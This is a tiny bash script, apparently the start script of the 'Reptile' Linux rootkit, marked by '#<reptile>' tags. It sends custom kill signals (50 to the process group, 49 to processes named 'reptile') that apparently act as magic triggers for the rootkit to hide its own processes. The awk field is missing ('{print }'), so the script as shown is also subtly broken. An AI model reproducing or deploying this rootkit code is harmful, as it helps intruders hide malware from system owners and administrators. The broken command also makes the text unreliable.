#!/bin/bash

#<reptile>

kill -50 0
kill -49 `ps -ef | grep reptile | grep -v grep | awk '{print }'`

#</reptile>
